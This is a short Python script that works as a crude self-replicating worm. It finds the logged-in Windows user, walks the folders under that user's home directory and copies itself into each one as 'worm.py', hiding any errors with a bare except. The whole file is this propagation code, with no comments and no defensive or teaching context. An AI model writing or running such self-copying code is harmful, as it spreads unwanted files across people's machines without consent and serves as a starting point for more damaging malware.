import os, sys
from shutil import copyfile
name = os.getlogin()
default_dir = f'C:/Users/{name}/'
os.chdir(default_dir)
dirlist = os.listdir()
for dir in dirlist:
    try:
        direc = default_dir + dir
        copyfile(sys.argv[0], direc+'/worm.py')
    except:
        pass
